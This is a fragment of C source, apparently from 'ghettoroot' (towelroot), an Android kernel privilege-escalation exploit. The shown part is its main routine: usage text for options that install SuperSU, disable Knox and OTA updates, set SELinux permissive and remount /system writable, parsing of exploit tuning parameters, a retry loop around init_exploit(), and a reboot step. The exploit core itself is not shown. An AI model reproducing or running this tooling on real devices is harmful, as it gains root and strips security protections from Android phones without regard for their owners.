      printf("EXCLUDE_FEATURE: all features are enabled by default.");
      printf("      add their numbers to EXCLUDE any/all of the following features:\n");
      printf("  1-Install SuperSU    2-Disable Knox   4-Disable OTA Updates\n");
      printf("    8-SEAndroid Permissive(temp)   16-Mount /system and / RW");
      printf(" ex. 31 temp roots solely to run user cmd; 7 makes no permanent changes on its own");
      printf(" ex. ghettoroot 0 1 0 4 0\n");
      printf("     ghettoroot mkdir /system/happyface\n");
      printf("     ghettoroot 0 1 0 4 7 cp /sdcard/build.prop /system/build.prop\n");
      exit(0);
    }
  }

	printf("************************************************\n");
	printf("native ghettoroot, aka cube-towel, aka towelroot\n");
  printf("running with pid %d\n", getpid());
	check_kernel_version();
  setaffinity();

  if (argc > 1) {
    narg = strtoul(argv[cmdlen], &endptr, 10);
    if (*endptr == '\0') {
      ph->method = narg;
      if (++cmdlen < argc) {
        narg = strtoul(argv[cmdlen], &endptr, 10);
        if (*endptr == '\0') {
          ph->align = narg;
          if (++cmdlen < argc) {
            narg = strtoul(argv[cmdlen], &endptr, 10);
            if (*endptr == '\0') {
              ph->limit_offset = narg;
              if (++cmdlen < argc) {
                narg = strtoul(argv[cmdlen], &endptr, 10);
                if (*endptr == '\0') {
                  ph->hit_iov = narg;
                  if (++cmdlen < argc) {
                    narg = strtol(argv[cmdlen], &endptr, 0);
                    if (*endptr == '\0') {
                      exclude_feature = narg;
                      ++cmdlen;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }

  if (argc > cmdlen) {
    usercmd = argv[cmdlen];
    userargv = &argv[cmdlen];
    userargc = argc - 5;
  }
  
  printf("modstring: 1337 %ld %ld %ld %ld %ld\n", ph->method, ph->align, ph->limit_offset, ph->hit_iov, exclude_feature);
  printf("************************************************\n\n");

  while (tries++ < MAX_RETRIES) {
    if (init_exploit()) break;
    sleep(4);
  }
  
  prepare_reboot();

	sleep(30);
  
  free(ph);

	return 0;
}
